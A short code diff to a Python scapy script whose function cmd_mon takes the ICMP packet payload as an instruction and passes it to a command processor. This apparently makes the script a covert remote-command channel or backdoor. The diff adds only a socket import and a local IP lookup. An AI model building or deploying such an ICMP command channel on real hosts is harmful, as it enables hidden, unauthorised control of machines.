@@ -2,9 +2,11 @@ from scapy.all import *
 import subprocess as sp
 import threading
 import sys
+import socket 
 cmn_cmds = []
 verbose = False
 fname = ""
+ip=socket.gethostbyname(socket.gethostname())  
 """This is the only way I can thing to pass a file name from one if to aother
 There might be a better way to accomplish this but this is the only way I can come up with at the current moment
 """
@@ -19,7 +21,7 @@ def cmd_mon(pkt):
         instruct = pkt.getlayer(ICMP).load.decode()
         print(instruct)
         cmd_proc(instruct, source)
-
+    
 def cmd_proc(cmd, source):
     global verbose, fname
     prefix = cmd[0]
